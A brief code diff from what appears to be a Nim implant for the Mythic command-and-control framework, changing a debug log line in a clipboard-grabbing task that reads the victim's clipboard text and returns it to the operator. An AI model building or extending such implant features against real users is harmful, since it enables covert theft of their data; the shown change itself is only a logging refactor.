@@ -38,7 +38,7 @@ proc clipboard*(taskId: string, params: JsonNode): JsonNode =
       discard GlobalUnlock(hClipboardData)
       CloseClipboard()
       
-      debug &"[DEBUG] Retrieved clipboard content ({clipboardText.len} characters)"
+      debugLog "clipboard", &"Retrieved clipboard content ({clipboardText.len} characters)"
       
       return mythicSuccess(taskId, clipboardText)
       
